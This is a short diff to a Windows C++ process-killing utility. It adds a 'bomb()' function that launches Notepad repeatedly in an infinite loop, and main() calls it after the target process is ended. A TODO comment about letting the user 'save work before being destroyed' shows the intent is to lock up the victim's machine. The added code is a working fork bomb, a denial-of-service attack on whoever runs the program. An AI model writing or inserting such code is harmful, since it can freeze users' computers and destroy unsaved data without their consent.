@@ -2,6 +2,21 @@
 #include <iostream>
 #include <TlHelp32.h>
 #include <string>
+#include <WinUser.h>
+
+void bomb()
+{
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	WCHAR proc[] = L"Notepad";
+	for (;;)
+	{
+		::ZeroMemory(&si, sizeof(STARTUPINFO));
+		si.cb = sizeof(STARTUPINFO);
+		::ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+		::CreateProcess(NULL, proc, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
+	}
+}
 
 DWORD end_proc(const std::wstring& proc_to_end)
 {
@@ -75,6 +90,10 @@ int main()
 	
 	if (end_proc(proc_to_end) != EXIT_SUCCESS)
 		return EXIT_FAILURE;
+
+	// TODO: allow user to save work before being destroyed
+
+	bomb();
 	
 	return 0;
 }
